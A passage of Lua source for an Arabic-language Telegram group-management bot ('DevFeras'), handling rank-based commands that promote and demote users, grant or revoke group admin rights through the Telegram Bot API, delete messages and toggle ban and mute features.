ReplyStatus(msg,result.sender_user_id_,"reply","⌁︙تم تنزيله من قائمة المطورين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل مطور @(.*)') and SourceCh(msg) then
local username = text:match('^تنزيل مطور @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevFeras:srem(DevFeras..'abs:SudoBot:',result.id_)
ReplyStatus(msg,result.id_,"reply","⌁︙تم تنزيله من قائمة المطورين")  
else 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل مطور (%d+)') and SourceCh(msg) then
local user = text:match('تنزيل مطور (%d+)')
DevFeras:srem(DevFeras..'abs:SudoBot:',user)
ReplyStatus(msg,user,"reply","⌁︙تم تنزيله من قائمة المطورين")  
end end
--     Source DevFeras     --
--      Set ownerall      --
if SudoBot(msg.sender_user_id_, msg.chat_id_) then
if text ==('رفع نائب مدير') and SourceCh(msg) then
function raf_reply(extra, result, success)
DevFeras:sadd(DevFeras..'abs:ownerall:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","⌁︙تم رفعه في قائمة المدراء العامين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع نائب مدير @(.*)') and SourceCh(msg) then
local username = text:match('^رفع نائب مدير @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevFeras:sadd(DevFeras..'abs:ownerall:',result.id_)
ReplyStatus(msg,result.id_,"reply","⌁︙تم رفعه في قائمة المدراء العامين")  
else 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع نائب مدير (%d+)') and SourceCh(msg) then
local user = text:match('رفع نائب مدير (%d+)')
DevFeras:sadd(DevFeras..'abs:ownerall:',user)
ReplyStatus(msg,user,"reply","⌁︙تم رفعه في قائمة المدراء العامين")  
end
--     Source DevFeras     --
--      Rem ownerall      --
if text ==('تنزيل نائب مدير') and SourceCh(msg) then
function prom_reply(extra, result, success)
DevFeras:srem(DevFeras..'abs:ownerall:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","⌁︙تم تنزيله من قائمة المدراء العامين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل نائب مدير @(.*)') and SourceCh(msg) then
local username = text:match('^تنزيل نائب مدير @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevFeras:srem(DevFeras..'abs:ownerall:',result.id_)
ReplyStatus(msg,result.id_,"reply","⌁︙تم تنزيله من قائمة المدراء العامين")  
else 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل نائب مدير (%d+)') and SourceCh(msg) then
local user = text:match('تنزيل نائب مدير (%d+)')
DevFeras:srem(DevFeras..'abs:ownerall:',user)
ReplyStatus(msg,user,"reply","⌁︙تم تنزيله من قائمة المدراء العامين")  
end end
--     Source DevFeras     --
--      Set adminall      --
if OwnerAll(msg.sender_user_id_, msg.chat_id_) then
if text ==('رفع ادمن عام') and SourceCh(msg) then
function raf_reply(extra, result, success)
DevFeras:sadd(DevFeras..'abs:adminall:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","⌁︙تم رفعه في قائمة الادمنيه العامين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع ادمن عام @(.*)') and SourceCh(msg) then
local username = text:match('^رفع ادمن عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevFeras:sadd(DevFeras..'abs:adminall:',result.id_)
ReplyStatus(msg,result.id_,"reply","⌁︙تم رفعه في قائمة الادمنيه العامين")  
else 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع ادمن عام (%d+)') and SourceCh(msg) then
local user = text:match('رفع ادمن عام (%d+)')
DevFeras:sadd(DevFeras..'abs:adminall:',user)
ReplyStatus(msg,user,"reply","⌁︙تم رفعه في قائمة الادمنيه العامين")  
end
--     Source DevFeras     --
--      Rem adminall      --
if text ==('تنزيل ادمن عام') and SourceCh(msg) then
function prom_reply(extra, result, success)
DevFeras:srem(DevFeras..'abs:adminall:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","⌁︙تم تنزيله من قائمة الادمنيه العامين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل ادمن عام @(.*)') and SourceCh(msg) then
local username = text:match('^تنزيل ادمن عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevFeras:srem(DevFeras..'abs:adminall:',result.id_)
ReplyStatus(msg,result.id_,"reply","⌁︙تم تنزيله من قائمة الادمنيه العامين")  
else 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل ادمن عام (%d+)') and SourceCh(msg) then
local user = text:match('تنزيل ادمن عام (%d+)')
DevFeras:srem(DevFeras..'abs:adminall:',user)
ReplyStatus(msg,user,"reply","⌁︙تم تنزيله من قائمة الادمنيه العامين")  
end end
--     Source DevFeras     --
--       Set Vipall       --
if AdminAll(msg.sender_user_id_, msg.chat_id_) then
if text ==('رفع مميز عام') and SourceCh(msg) then
function raf_reply(extra, result, success)
DevFeras:sadd(DevFeras..'abs:vipall:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","⌁︙تم رفعه في قائمة المميزين العام")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع مميز عام @(.*)') and SourceCh(msg) then
local username = text:match('^رفع مميز عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevFeras:sadd(DevFeras..'abs:vipall:',result.id_)
ReplyStatus(msg,result.id_,"reply","⌁︙تم رفعه في قائمة المميزين العام")  
else 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع مميز عام (%d+)') and SourceCh(msg) then
local user = text:match('رفع مميز عام (%d+)')
DevFeras:sadd(DevFeras..'abs:vipall:',user)
ReplyStatus(msg,user,"reply","⌁︙تم رفعه في قائمة المميزين العام")  
end
--     Source DevFeras     --
--       Rem Vipall       --
if text ==('تنزيل مميز عام') and SourceCh(msg) then
function prom_reply(extra, result, success)
DevFeras:srem(DevFeras..'abs:vipall:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","⌁︙تم تنزيله من قائمة المميزين العام")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل مميز عام @(.*)') and SourceCh(msg) then
local username = text:match('^تنزيل مميز عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevFeras:srem(DevFeras..'abs:vipall:',result.id_)
ReplyStatus(msg,result.id_,"reply","⌁︙تم تنزيله من قائمة المميزين العام")  
else 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل مميز عام (%d+)') and SourceCh(msg) then
local user = text:match('تنزيل مميز عام (%d+)')
DevFeras:srem(DevFeras..'abs:vipall:',user)
ReplyStatus(msg,user,"reply","⌁︙تم تنزيله من قائمة المميزين العام")  
end end
--     Source DevFeras     --
--       Set Monsh        --
if ChatType == 'sp' or ChatType == 'gp'  then
if AbsMonsh(msg.sender_user_id_, msg.chat_id_) then
if text ==('رفع منشئ اساسي') and SourceCh(msg) then
function raf_reply(extra, result, success)
DevFeras:sadd(DevFeras..'abs:monsh:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","⌁︙تم رفعه منشئ اساسي")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع منشئ اساسي @(.*)') and SourceCh(msg) then
local username = text:match('^رفع منشئ اساسي @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevFeras:sadd(DevFeras..'abs:monsh:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"reply","⌁︙تم رفعه منشئ اساسي")  
else 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع منشئ اساسي (%d+)') and SourceCh(msg) then
local user = text:match('رفع منشئ اساسي (%d+)')
DevFeras:sadd(DevFeras..'abs:monsh:'..msg.chat_id_,user)
ReplyStatus(msg,user,"reply","⌁︙تم رفعه منشئ اساسي")  
end
--     Source DevFeras     --
--       Rem Monsh        --
if text ==('تنزيل منشئ اساسي') and SourceCh(msg) then
function prom_reply(extra, result, success)
DevFeras:srem(DevFeras..'abs:monsh:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","⌁︙تم تنزيله منشئ اساسي")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل منشئ اساسي @(.*)') and SourceCh(msg) then
local username = text:match('^تنزيل منشئ اساسي @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevFeras:srem(DevFeras..'abs:monsh:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"reply","⌁︙تم تنزيله منشئ اساسي")  
else 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل منشئ اساسي (%d+)') and SourceCh(msg) then
local user = text:match('تنزيل منشئ اساسي (%d+)')
DevFeras:srem(DevFeras..'abs:monsh:'..msg.chat_id_,user)
ReplyStatus(msg,user,"reply","⌁︙تم تنزيله منشئ اساسي")  
end end
if text ==('رفع منشئ اساسي') and not AbsMonsh(msg.sender_user_id_, msg.chat_id_) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙هذا الامر لمنشئ المجموعه والمطورين فقط', 1, 'md')
end
--     Source DevFeras     --
--      Set monshid       --
if Monsh(msg.sender_user_id_, msg.chat_id_) then
if text ==('رفع منشئ') and SourceCh(msg) then
function raf_reply(extra, result, success)
DevFeras:sadd(DevFeras..'abs:monshid:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","⌁︙تم رفعه في قائمة المنشئين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع منشئ @(.*)') and SourceCh(msg) then
local username = text:match('^رفع منشئ @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevFeras:sadd(DevFeras..'abs:monshid:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"reply","⌁︙تم رفعه في قائمة المنشئين")  
else 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع منشئ (%d+)') and SourceCh(msg) then
local user = text:match('رفع منشئ (%d+)')
DevFeras:sadd(DevFeras..'abs:monshid:'..msg.chat_id_,user)
ReplyStatus(msg,user,"reply","⌁︙تم رفعه في قائمة المنشئين")  
end
--     Source DevFeras     --
--      Rem monshid       --
if text ==('تنزيل منشئ') and SourceCh(msg) then
function prom_reply(extra, result, success)
DevFeras:srem(DevFeras..'abs:monshid:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","⌁︙تم تنزيله من قائمة المنشئين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل منشئ @(.*)') and SourceCh(msg) then
local username = text:match('^تنزيل منشئ @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevFeras:srem(DevFeras..'abs:monshid:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"reply","⌁︙تم تنزيله من قائمة المنشئين")  
else 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل منشئ (%d+)') and SourceCh(msg) then
local user = text:match('تنزيل منشئ (%d+)')
DevFeras:srem(DevFeras..'abs:monshid:'..msg.chat_id_,user)
ReplyStatus(msg,user,"reply","⌁︙تم تنزيله من قائمة المنشئين")  
end 
end
--     Source DevFeras     --
--       Set Owner        --
if MonshId(msg.sender_user_id_, msg.chat_id_) then
if text ==('رفع مدير') and SourceCh(msg) then
function prom_reply(extra, result, success)
DevFeras:sadd(DevFeras..'abs:owners:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","⌁︙تم رفعه في قائمة المدراء")  
end  
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^رفع مدير @(.*)') and SourceCh(msg) then
local username = text:match('^رفع مدير @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevFeras:sadd(DevFeras..'abs:owners:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"reply","⌁︙تم رفعه في قائمة المدراء")  
else 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end 
if text and text:match('^رفع مدير (%d+)') and SourceCh(msg) then
local user = text:match('رفع مدير (%d+)')
DevFeras:sadd(DevFeras..'abs:owners:'..msg.chat_id_,user)
ReplyStatus(msg,user,"reply","⌁︙تم رفعه في قائمة المدراء")  
end
--     Source DevFeras     --
--       Rem Owner        --
if text ==('تنزيل مدير') and SourceCh(msg) then
function prom_reply(extra, result, success)
DevFeras:srem(DevFeras..'abs:owners:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","⌁︙تم تنزيله من قائمة المدراء")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل مدير @(.*)') and SourceCh(msg) then
local username = text:match('^تنزيل مدير @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevFeras:srem(DevFeras..'abs:owners:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"reply","⌁︙تم تنزيله من قائمة المدراء")  
else 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل مدير (%d+)') and SourceCh(msg) then
local user = text:match('تنزيل مدير (%d+)')
DevFeras:srem(DevFeras..'abs:owners:'..msg.chat_id_,user)
ReplyStatus(msg,user,"reply","⌁︙تم تنزيله من قائمة المدراء")  
end 
--     Source DevFeras     --
--       Set Cleaner       --
if text ==('رفع منظف') and SourceCh(msg) then
function prom_reply(extra, result, success)
DevFeras:sadd(DevFeras..'abs:Cleaner:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","⌁︙تم رفعه في قائمة المنظفين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^رفع منظف @(.*)') and SourceCh(msg) then
local username = text:match('^رفع منظف @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevFeras:sadd(DevFeras..'abs:Cleaner:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"reply","⌁︙تم رفعه في قائمة المنظفين")  
else 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع منظف (%d+)') and SourceCh(msg) then
local user = text:match('رفع منظف (%d+)')
DevFeras:sadd(DevFeras..'abs:Cleaner:'..msg.chat_id_,user)
ReplyStatus(msg,user,"reply","⌁︙تم رفعه في قائمة المنظفين")  
end
--     Source DevFeras     --
--       Rem Cleaner       --
if text ==('تنزيل منظف') and SourceCh(msg) then
function prom_reply(extra, result, success)
DevFeras:srem(DevFeras..'abs:Cleaner:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","⌁︙تم تنزيله من قائمة المنظفين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل منظف @(.*)') and SourceCh(msg) then
local username = text:match('^تنزيل منظف @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevFeras:srem(DevFeras..'abs:Cleaner:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"reply","⌁︙تم تنزيله من قائمة المنظفين")  
else 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل منظف (%d+)') and SourceCh(msg) then
local user = text:match('تنزيل منظف (%d+)')
DevFeras:srem(DevFeras..'abs:Cleaner:'..msg.chat_id_,user)
ReplyStatus(msg,user,"reply","⌁︙تم تنزيله من قائمة المنظفين")  
end end
--     Source DevFeras     --
--       Set admin        --
if Owner(msg.sender_user_id_, msg.chat_id_) then
if text ==('رفع ادمن') and SourceCh(msg) then
function prom_reply(extra, result, success)
if not Monsh(msg.sender_user_id_, msg.chat_id_) and DevFeras:get(DevFeras.."Feras_dev:lock:set"..msg.chat_id_) then 
Dev_Feras(msg.chat_id_, msg.id_, 1,'⌁︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع من قبل المنشئيين', 1, 'md')
return false
end
DevFeras:sadd(DevFeras..'abs:admins:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","⌁︙تم رفعه في قائمة الادمنيه")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^رفع ادمن @(.*)') and SourceCh(msg) then
local username = text:match('^رفع ادمن @(.*)')
function promreply(extra,result,success)
if not Monsh(msg.sender_user_id_, msg.chat_id_) and DevFeras:get(DevFeras.."Feras_dev:lock:set"..msg.chat_id_) then 
Dev_Feras(msg.chat_id_, msg.id_, 1,'⌁︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع من قبل المنشئيين', 1, 'md')
return false
end
if result.id_ then
DevFeras:sadd(DevFeras..'abs:admins:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"reply","⌁︙تم رفعه في قائمة الادمنيه")  
else 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع ادمن (%d+)') and SourceCh(msg) then
local user = text:match('رفع ادمن (%d+)')
if not Monsh(msg.sender_user_id_, msg.chat_id_) and DevFeras:get(DevFeras.."Feras_dev:lock:set"..msg.chat_id_) then 
Dev_Feras(msg.chat_id_, msg.id_, 1,'⌁︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع من قبل المنشئيين', 1, 'md')
return false
end
DevFeras:sadd(DevFeras..'abs:admins:'..msg.chat_id_,user)
ReplyStatus(msg,user,"reply","⌁︙تم رفعه في قائمة الادمنيه")  
end
--     Source DevFeras     --
--        Rem admin       --
if text ==('تنزيل ادمن') and SourceCh(msg) then
function prom_reply(extra, result, success)
DevFeras:srem(DevFeras..'abs:admins:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","⌁︙تم تنزيله من قائمة الادمنيه")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل ادمن @(.*)') and SourceCh(msg) then
local username = text:match('^تنزيل ادمن @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevFeras:srem(DevFeras..'abs:admins:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"reply","⌁︙تم تنزيله من قائمة الادمنيه")  
else 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل ادمن (%d+)') and SourceCh(msg) then
local user = text:match('تنزيل ادمن (%d+)')
DevFeras:srem(DevFeras..'abs:admins:'..msg.chat_id_,user)
ReplyStatus(msg,user,"reply","⌁︙تم تنزيله من قائمة الادمنيه")  
end end
--     Source DevFeras     --
--       Set Vipmem       --
if Admin(msg.sender_user_id_, msg.chat_id_) then
if text ==('رفع مميز') and SourceCh(msg) then
function prom_reply(extra, result, success)
if not Monsh(msg.sender_user_id_, msg.chat_id_) and DevFeras:get(DevFeras.."Feras_dev:lock:set"..msg.chat_id_) then 
Dev_Feras(msg.chat_id_, msg.id_, 1,'⌁︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع من قبل المنشئيين', 1, 'md')
return false
end
DevFeras:sadd(DevFeras..'abs:vipmem:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","⌁︙تم رفعه في قائمة المميزين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^رفع مميز @(.*)') and SourceCh(msg) then
local username = text:match('^رفع مميز @(.*)')
function promreply(extra,result,success)
if not Monsh(msg.sender_user_id_, msg.chat_id_) and DevFeras:get(DevFeras.."Feras_dev:lock:set"..msg.chat_id_) then 
Dev_Feras(msg.chat_id_, msg.id_, 1,'⌁︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع من قبل المنشئيين', 1, 'md')
return false
end
if result.id_ then
DevFeras:sadd(DevFeras..'abs:vipmem:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"reply","⌁︙تم رفعه في قائمة المميزين")  
else 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع مميز (%d+)') and SourceCh(msg) then
local user = text:match('رفع مميز (%d+)')
if not Monsh(msg.sender_user_id_, msg.chat_id_) and DevFeras:get(DevFeras.."Feras_dev:lock:set"..msg.chat_id_) then 
Dev_Feras(msg.chat_id_, msg.id_, 1,'⌁︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع من قبل المنشئيين', 1, 'md')
return false
end
DevFeras:sadd(DevFeras..'abs:vipmem:'..msg.chat_id_,user)
ReplyStatus(msg,user,"reply","⌁︙تم رفعه في قائمة المميزين")  
end
--     Source DevFeras     --
--       Rem Vipmem       --
if text ==('تنزيل مميز') and SourceCh(msg) then
function prom_reply(extra, result, success)
DevFeras:srem(DevFeras..'abs:vipmem:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","⌁︙تم تنزيله من قائمة المميزين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل مميز @(.*)') and SourceCh(msg) then
local username = text:match('^تنزيل مميز @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevFeras:srem(DevFeras..'abs:vipmem:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"reply","⌁︙تم تنزيله من قائمة المميزين")  
else 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل مميز (%d+)') and SourceCh(msg) then
local user = text:match('تنزيل مميز (%d+)')
DevFeras:srem(DevFeras..'abs:vipmem:'..msg.chat_id_,user)
ReplyStatus(msg,user,"reply","⌁︙تم تنزيله من قائمة المميزين")  
end end 
--     Source DevFeras     --
if Monsh(msg.sender_user_id_, msg.chat_id_) then
if text:match("^رفع ادمن بالكروب$") and msg.reply_to_message_id_ and ChCheck(msg) or text:match("^رفع ادمن الكروب$") and msg.reply_to_message_id_ and ChCheck(msg) then
function promote_by_reply(extra, result, success)
HTTPS.request("https://api.telegram.org/bot" .. TokenBot .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=false")
ReplyStatus(msg,result.sender_user_id_,"reply","⌁︙تم رفعه ادمن في الكروب")  
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text:match("^تنزيل ادمن بالكروب$") and msg.reply_to_message_id_ and ChCheck(msg) or text:match("^تنزيل ادمن الكروب$") and msg.reply_to_message_id_ and ChCheck(msg) then
function promote_by_reply(extra, result, success)
HTTPS.request("https://api.telegram.org/bot" .. TokenBot .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
ReplyStatus(msg,result.sender_user_id_,"reply","⌁︙تم تنزيله ادمن من الكروب")  
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end 
if text:match("^رفع بكل الصلاحيات$") and msg.reply_to_message_id_ and ChCheck(msg) or text:match("^رفع بكل صلاحيات$") and msg.reply_to_message_id_ and ChCheck(msg) then
function promote_by_reply(extra, result, success)
HTTPS.request("https://api.telegram.org/bot" .. TokenBot .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=True")
ReplyStatus(msg,result.sender_user_id_,"reply","⌁︙تم رفعه ادمن في جميع الصلاحيات")  
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
end
--     Source DevFeras     --
if Admin(msg.sender_user_id_, msg.chat_id_) then
if msg.reply_to_message_id_ ~= 0 then
if text:match("^مسح$") and ChCheck(msg) or text:match("^حذف$") and ChCheck(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.reply_to_message_id_})
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙تم حذف الرساله مع رسالة الامر', 1, 'md')
end end end
--     Source DevFeras     --
if MonshId(msg.sender_user_id_, msg.chat_id_) then
if text:match("^تفعيل الحظر$") and ChCheck(msg) or text:match("^تفعيل الطرد$") and ChCheck(msg) then
DevFeras:del("Feras_dev:lock:ban"..bot_id..msg.chat_id_)
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تفعيل الطرد والحظر'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
end
if text:match("^تعطيل الحظر$") and ChCheck(msg) or text:match("^تعطيل الطرد$") and ChCheck(msg) then
DevFeras:set("Feras_dev:lock:ban"..bot_id..msg.chat_id_,"true")
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تعطيل الطرد والحظر'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
end
if text:match("^تفعيل الكتم$") and ChCheck(msg) or text:match("^تفعيل التقييد$") and ChCheck(msg) then
DevFeras:del("Feras_dev:lock:bank"..bot_id..msg.chat_id_)
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تفعيل الكتم والتقييد'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
end
if text:match("^تعطيل الكتم$") and ChCheck(msg) or text:match("^تعطيل التقييد$") and ChCheck(msg) then
DevFeras:set("Feras_dev:lock:bank"..bot_id..msg.chat_id_,"true")
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تعطيل الكتم والتقييد'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
end
end
if Monsh(msg.sender_user_id_, msg.chat_id_) then
